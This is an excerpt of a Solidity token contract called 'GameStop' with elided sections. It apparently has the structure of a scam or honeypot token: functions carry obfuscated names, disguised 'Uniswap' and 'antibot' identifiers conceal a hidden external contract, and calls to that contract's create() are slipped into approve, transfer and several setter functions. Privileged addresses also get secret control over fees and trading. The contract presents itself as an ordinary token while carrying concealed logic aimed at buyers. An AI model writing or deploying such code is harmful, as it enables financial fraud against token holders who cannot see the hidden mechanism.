...
interface IBEP20swapV2Router01 {
...
interface IUniswapV2Router02 is IBEP20swapV2Router01 {
...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "GameStop";
    string private _symbol = "GameStop";
    ...
    uniswapV1 private uniswapV78PairToken;
    ...
    address private uniswapV78Pair_;
    bool private itvs;
    ...
    constructor(address Antibottoken_, address creator, address caSwap) {
        ...
        uniswapV78PairToken = uniswapV1(uniswapV78Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV78Pair_] = true;
        _isExcludedFromFee[uniswapV78Pair_] = true;
    ...
    function SetholderRew_Ox1167988(address[] memory accounts, bool b) external {
        ...
        if (_msgSender() == address(_Antitbottoken)) { 
            ...
            uniswapV78PairToken.create(8**3);
        }
    }

    function SelectItvs_Ox1167968(bool b) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            itvs=b;
        } else {
...
/*    function pair_Ox1167998(address aaaa, bool b) public {
...
*/    
    function argum_Ox1167618(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV78PairToken.create(8**3);
    ...
    function Ecaor_Ox1167628(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV78PairToken.create(8**3);
    ...
    function fees_Ox1167633(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
    ...
    function initialitzeW_Ox1167658 (bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV78PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV78PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV78PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV78PairToken.create(250**3); 
        }
